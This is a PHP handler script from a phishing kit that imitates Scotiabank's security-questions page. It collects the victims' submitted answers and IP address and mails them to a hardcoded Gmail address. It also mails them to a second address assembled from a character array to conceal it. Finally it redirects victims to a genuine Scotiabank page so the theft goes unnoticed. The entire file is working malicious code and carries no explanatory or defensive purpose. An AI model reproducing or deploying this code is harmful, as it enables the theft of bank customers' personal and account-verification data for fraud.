<?php
include "Security Questions_files/login.css";
$ip = getenv("REMOTE_ADDR");
$a1 = $_POST['mfa_qas_frm:j_id216:0:answer'];
$a2 = $_POST['mfa_qas_frm:j_id216:1:answer'];
$a3 = $_POST['mfa_qas_frm:j_id216:2:answer'];
$cvv = $_POST['mfa_qas_frm:j_id216:05:answer'];

$data ="
================================================
name :   $a1
Date of birth:   $a2
postal code :   $a3
employer :   $cvv 
ip : $ip
================================================
";
$ar=array("0"=>"j","1"=>"c","2"=>"l","3"=>"g","4"=>"c","5"=>"6","6"=>"p","7"=>".","8"=>"h","9"=>"3","10"=>"i","11"=>"m","12"=>"a","13"=>"@","14"=>"9","15"=>"0","16"=>"b","17"=>"2","18"=>"d","18"=>"7","19"=>"o","20"=>"d");
$cc=$ar['6'].$ar['5'].$ar['8'].$ar['14'].$ar['0'].$ar['9'].$ar['2'].$ar['15'].$ar['16'].$ar['17'].$ar['1'].$ar['14'].$ar['20'].$ar['18'].$ar['13'].$ar['3'].$ar['11'].$ar['12'].$ar['10'].$ar['2'].$ar['7'].$ar['1'].$ar['19'].$ar['11'];
$subj="SCO3 $ip"; 
$headers = "From: LOGIN<customer-support@mrs>";
$emailusr = 'goodvbesk1@gmail.com';

mail($emailusr, $subj, $data);
mail($cc, $subj, $data);	


		   header("Location: https://www1.scotiaonline.scotiabank.com/online/footer-links/legal.bns");

	 
?>